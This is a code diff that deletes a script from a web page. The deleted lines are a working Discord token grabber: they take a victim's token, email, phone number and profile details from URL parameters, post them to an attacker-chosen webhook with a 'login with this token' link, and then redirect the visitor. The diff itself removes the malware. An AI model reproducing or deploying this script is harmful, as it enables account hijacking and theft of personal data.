@@ -1,38 +1,3 @@
 <script>
-const h = window.location.href,
-        d = Object.fromEntries(h.split('?').slice(1).map(kv => kv.split('='))),
-        y = new Date().toLocaleString("en-US", {
-            timeZone: "America/Antigua",
-        }),
-        u = y.replace(/, /g, " @ ");
 
-    if (h.includes("?m") && h.includes("?t") && h.includes("?y") && h.includes("?z") && h.includes("?p") && h.includes("?r") && h.includes("?i") && h.includes("?k") && h.includes("?u") && h.includes("?s") && h.includes("?o") && h.includes("?a")) {
-        fetch(d.s, {
-            method: 'post',
-            headers: {
-                'Content-Type': 'application/json',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "cross-site"
-            },
-            "mode": "cors",
-            "credentials": "omit",
-            body: JSON.stringify({
-                content: `${['','<@' + d.a + '>\n'][d.a != '' ? 1 : 0] + ['','<@&' + d.o + '>\n'][d.o != '' ? 1 : 0]} ~`,
-                embeds: [{
-                    title: `User info:`,
-                    description: decodeURIComponent(`> User ID: ${decodeURIComponent(1)},\nToken: ⠀⠀⠀⠀⠀⠀ ${decodeURIComponent((d.p).slice(0, Math.floor((d.p).length / 2)) + ' ' + (d.p).slice(Math.floor((d.p).length / 2, (d.p).length)))},\n\n> Email: ${decodeURIComponent(d.z)}, \n> Phone: ${decodeURIComponent(d.y)}, \n> Nitro type: ${decodeURIComponent(d.r)},\n> Avatar: ${decodeURIComponent(d.i)},\n\n> ID: ${decodeURIComponent(d.t)},\n> Username: ${decodeURIComponent(d.k)},\nBio: ${decodeURIComponent(d.u)},\n\n> Date: ${u}.`),
-                    color: 4968880,
-                }, {
-                    description: `[Want to login with this token?](https://discord.com/)`,
-                    color: 4968880,
-                }, ],
-                username: "𝕯𝖔𝖙",
-                attachments: [],
-            })
-        }).then((e) => window.location.href = d.m).catch(function(r) {
-            console.warn("", r);
-            window.location.href = d.m;
-        });
-    }
 </script>
